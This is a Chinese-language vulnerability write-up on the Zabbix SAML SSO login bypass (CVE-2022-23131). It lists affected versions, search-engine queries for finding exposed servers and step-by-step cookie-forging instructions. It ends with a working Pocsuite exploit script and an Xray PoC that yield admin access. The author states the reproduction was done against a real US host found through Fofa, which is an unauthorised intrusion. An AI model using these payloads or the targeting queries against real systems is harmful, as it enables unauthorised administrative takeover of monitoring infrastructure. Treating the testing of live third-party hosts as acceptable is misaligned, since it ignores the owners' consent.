# 产品简介

Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。

zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix
agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free
BSD，Open BSD，OS X等平台上。

# 漏洞原因

在启用 SAML SSO 身份验证（非默认）的情况下，未经身份验证的攻击者可以通过修改Cookie数据，绕过身份认证获得对 Zabbix
前端的管理员访问权限。

# 影响范围

4.0.36

5.4.0

5.4.8

6.0.0alpha1

# 搜索语法

### Fofa

app="ZABBIX-监控系统" && body="SAML"

### Zoomeye

title:"ZABBIX"

### Shodan

title="ZABBIX"

# 漏洞检测

可使用<https://github.com/trganda/dockerenv/tree/master/vuln/zabbix/CVE-2022-23131>搭建漏洞环境，检测该漏洞的主要步骤为：

> 获取Set-Cookie数据zbx_session参数的值
>
> 通过Url解码和Base64解码获得zbx_session参数Json格式数据
>
> 通过在Json中添加saml_data和username_attribute参数后重新Base64编码和Url编码构造Payload
>
> 在请HTTP求头中添加构造的Payload，然后请求index_sso.php
>
> 若HTTP响应头中包含Location头，说明存在漏洞

![](https://image.3001.net/images/20220225/1645800720_6218ed1001855584836c4.png!small)

![](https://image.3001.net/images/20220225/1645800732_6218ed1c514cedbfdf6d3.png!small)

# 漏洞复现

本次复现使用Fofa搜索到的美国资产进行复现。首先获取Set-Cookie，如图：

![](https://image.3001.net/images/20220225/1645800745_6218ed29508f196bc8561.png!small)

然后解码数据，如图：

![](https://image.3001.net/images/20220225/1645800760_6218ed38150fa4e73ee84.png!small)

    
    
    {"sessionid":"4e733c1344948aba99594418d500ea6f","sign":"njRfEFFQEnQl4F6oQDXxfVF6UYcroMsEPKCB6UzewMCnGQpzpZseaBgGxEzNJOtbMRtwQNKJCqAXccrwc6rxpw=="}
    

接着构造Payload，如下：

    
    
    {"saml_data":{"username_attribute":"Admin"},"sessionid":"4e733c1344948aba99594418d500ea6f","sign":"njRfEFFQEnQl4F6oQDXxfVF6UYcroMsEPKCB6UzewMCnGQpzpZseaBgGxEzNJOtbMRtwQNKJCqAXccrwc6rxpw=="}
    

通过Base64编码和URL编码后带入请求index_sso.php，如图：

![](https://image.3001.net/images/20220225/1645800776_6218ed483093719207216.png!small)

成功进入管理页面，如图：

![](https://image.3001.net/images/20220225/1645800786_6218ed52c12dcf34b4f22.png!small)

# Exp

### Pocsuite

    
    
    import re
    from collections import OrderedDict
    from pocsuite3.lib.utils import random_str
    from pocsuite3.api \
        import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port
    from pocsuite3.lib.core.interpreter_option \
        import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
    from pocsuite3.modules.listener import REVERSE_PAYLOAD
    import base64
    import json
    from urllib.parse import unquote,quote
    
    requests.packages.urllib3.disable_warnings()
    class DemoPOC(POCBase):
        vulID = '0'                  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
        version = '1'                   # 默认为1
        author = 'Infiltrator'               # PoC作者的大名
        vulDate = '2022-2-25'          # 漏洞公开的时间,不知道就写今天
        createDate = '2021-8-20'       # 编写 PoC 的日期
        updateDate = '2021-9-12'       # PoC 更新的时间,默认和编写时间一样
        references = ['']      # 漏洞地址来源,0day不用写
        name = 'Zabbix SAML SSO 登录绕过漏洞（CVE-2022-23131）'   # PoC 名称
        appPowerLink = ''    # 漏洞厂商主页地址
        appName = '-'          # 漏洞应用名称
        appVersion = '-'          # 漏洞影响版本
        vulType = VUL_TYPE.COMMAND_EXECUTION      # 漏洞类型,类型参考见 漏洞类型规范表
        category = POC_CATEGORY.EXPLOITS.WEBAPP
        samples = []                # 测试样列,就是用 PoC 测试成功的网站
        install_requires = []       # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
        desc = '''
                在启用 SAML SSO 身份验证（非默认）的情况下，未经身份验证的攻击者可以通过修改Cookie数据，绕过身份认证获得对 Zabbix 前端的管理员访问权限。
            '''                     # 漏洞简要描述
        pocDesc = ''' 
                poc的用法描述 
            '''                     # POC用法描述
    
        def _options(self):
            opt = OrderedDict()     # value = self.get_option('key')
            return opt
    
        def _verify(self):
            output = Output(self)
            # 验证代码
            s=requests.Session()
            try:
                html=s.get(self.url,verify=False)
            except:
                output.fail('Could not get Cookie!')
                return output
            try:
                set_cookie=base64.b64decode(unquote(html.cookies['zbx_session'])).decode('utf8')
            except KeyError:
                output.fail('Could not find zbx_session in Cookies')
                return output
    
            set_cookie=json.loads(set_cookie)
            new_cookie=base64.b64encode(json.dumps({"saml_data":{"username_attribute":"Admin"},'sessionid':set_cookie['sessionid'],'sign':set_cookie['sign']}).encode('utf8')).decode('utf8')
            head={'Cookie':'zbx_session='+new_cookie}
            res=s.get(self.url+'/index_sso.php',headers=head,verify=False)
            
            if 'User settings' and 'Zabbix SIA' in res.text:
                result={}
                result["Cookie"]='zbx_session='+new_cookie
                output.success(result)
            return output
    
        def _attack(self):
            _verify()
    
    # 注册 DemoPOC 类
    register_poc(DemoPOC)
    
    

## 效果

![](https://image.3001.net/images/20220225/1645800800_6218ed603373df9d7c368.png!small)

### Xray

    
    
    name: poc-yaml-Zabbix-SAML-SSO-login-bypass-CVE-2022-23131
    # 脚本部分
    transport: http
    rules:
        r1:
            request:
                method: GET
                path: "/"
                follow_redirects: false
            expression: |
                response.headers['Set-Cookie'].contains("zbx_session=")
            output:
               search: r'zbx_session=(?P<zbx_session>.+(?=;))'.submatch(response.headers["Set-Cookie"])
               zbx_session: base64Decode(urldecode(search["zbx_session"]))
               # 获取{"sessionid":"xxx","sign":"xxx"}
               search2: r'(?P<sessionid>sessionid.+)'.submatch(zbx_session)
               sessionid: search2["sessionid"]
        r2:
            request:
                method: GET
                path: "/index_sso.php"
                headers: 
                    # 构造Payload
                    Cookie: zbx_session=urlencode(base64({"saml_data":{"username_attribute":"Admin"},"sessionid":{{sessionid}},"sign":{{sign}}}))
                follow_redirects: false
            expression: #response.raw_header.contains("Location")
                response.status==302 && response.headers['location'].contains("https://accounts.google.com/o/saml2/idp?idpid=") && response.headers['location'].contains("index_sso.php")
    expression:
        r1() && r2()
    # 信息部分
    detail:
        author: Infiltrator(https://github.com/NHPT)
        links: 
            - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-1030
        match: "Location: https://accounts.google.com/o/saml2/idp?idpid=xxx"
        cve: "CVE-2022-23131"
        repair: http://www.cnnvd.org.cn/web/xxk/bdxqById.tag?id=178203
    

## 效果

![](https://image.3001.net/images/20220225/1645800812_6218ed6c14dd1b16a6b26.png!small)

